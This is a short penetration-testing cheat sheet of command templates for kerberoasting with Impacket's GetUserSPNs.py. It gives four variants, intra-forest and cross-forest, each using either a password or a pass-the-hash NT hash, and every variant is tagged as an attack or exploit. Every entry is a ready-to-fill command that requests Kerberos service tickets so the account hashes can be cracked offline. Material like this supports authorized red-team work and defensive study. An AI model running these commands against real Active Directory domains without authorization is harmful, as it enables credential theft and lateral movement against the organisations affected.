# GetUSERSPN (imp)

% impacket-kerberos, windows, kerberos, 88

## kerberoasting - intra forest (user account)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -dc-ip <dc_ip> '<domain_fqdn>/<user>:<password>'
```


## kerberoasting (pth)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -dc-ip <dc_ip> -hashes :<nt_hash> '<domain_fqdn>/<user>'
```

## kerberoasting - cross forest (user account)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -target-domain <dst_domain_fqdn> '<domain_fqdn>/<user>:<password>'
```


## kerberoasting - cross forest (pth)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -target-domain <dst_domain_fqdn> -hashes :<nt_hash> '<domain_fqdn>/<user>'
```